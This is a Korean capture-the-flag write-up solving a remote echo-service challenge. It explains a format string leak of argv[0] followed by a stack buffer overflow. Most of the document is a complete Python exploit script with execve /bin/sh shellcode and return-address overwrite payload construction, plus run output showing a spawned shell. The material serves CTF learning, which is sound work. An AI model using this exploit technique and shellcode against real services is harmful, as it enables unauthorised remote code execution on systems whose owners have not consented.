#### 1. 문제 분석 및 풀이

이번 문제는 remote exploit 이지만 FSB(Format String Bug)와 Buffer Overflow 두 가지 취약점이나 있으므로 생각보다 쉽게 풀립니다.

ASLR이 걸려있지만 우리에겐 든든한 FSB취약점이 존재하므로 do_echo함수의 printf에 브레이크 포인트를 걸고 스택의 값들을 찬찬히 둘러보면, 여러가지 주소가 스택에 있습니다.

FSB를 이용하면 어떤 값이든 가져올 수 있는데 문제는 어떤 값을 가져오는게 좋겠느냐 겠지요.

여기서 어떤값을 택하느냐에 따라 여러가지 풀이가 나올 수 있는데 제가 택한 값은 argv[0]의 주소 입니다.

이 argv[0]의 주소는 %70$8x 를 넣어 주면 되고 주소를 알아냈으니 Buffer Overflow로 argv[0]값을 shellcode로 덮으면 되겠네요.


이때 스택의 구조를 보면 다음과 같습니다.

`[buffer 256 byte] [12 byte dummy] [return address] [8 byte dummy] [argv[0]]`

#### 2. Exploit Code

```Python
# exploit.py
from socket import *
from struct import *
import telnetlib
import time
import sys

def recv_until(s, data):
        buf = ""
        while True:
                c = s.recv(1)
                buf += c
                if data in buf:
                        break
        return buf

host = 'play.hexa.pro'
port = 12345

s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

# STAGE 1: Leak stack address
recv_until(s, "Welcome to HeXA Echo Service!")
s.send("LEAP%70$8x\n")
recv_until(s, "LEAP")

# leaked_addr is address of argv[0]
leaked_addr = int(s.recv(8),16)

# gdb-peda$ shellcode generate x86/linux exec
# x86/linux/exec: 24 bytes
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

# STAGE 2: Exploit
payload = ""
payload+= "A"*256                 # char buffer[256]
payload+= "B"*12                  # 12 byte dummy
payload+= pack("<L", leaked_addr) # return address
payload+= "C"*8                   # 8 byte dummy
payload+= shellcode               # shellcode

print "[+] Send payload..."
s.send(payload + "\n")

print "[*] You got a shell!"
s.send("cat flag\n")

# Interact with server
try:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        t.close()
except KeyboardInterrupt:
        pass
```

```Shell
$ python exploit.py
[+] Send payload...
[*] You got a shell!

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB▒a▒CCCCCCC1▒Ph//shh/bin▒▒1ɉ▒j
                                                            X̀
What the buggy echo server :(

```
